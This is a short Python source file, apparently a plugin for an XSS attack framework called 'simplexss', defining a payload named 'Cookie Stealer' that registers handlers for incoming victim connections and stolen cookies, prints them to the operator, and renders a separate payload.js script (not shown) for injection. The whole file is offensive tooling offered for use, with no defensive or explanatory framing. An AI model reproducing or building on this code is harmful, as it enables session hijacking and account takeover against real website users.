from simplexss.api import BaseClient, BaseEvent, BasePayload, render


class Payload(BasePayload):
    AUTHOR = "crazyproger1"
    DESCRIPTION = "Steals cookies."
    NAME = "Cookie Stealer"
    VERSION = "0.0.1"

    async def on_cookies(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Cookies: {event.data.get("cookies")}')

    async def on_connection(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f"Connection established: {client.origin}")

    def bind_endpoints(self):
        self.transport.bind_endpoint("connection", self.on_connection)
        self.transport.bind_endpoint("cookies", self.on_cookies)

    @property
    def payload(self) -> str:
        return render(
            self.directory,
            "payload.js",
        )
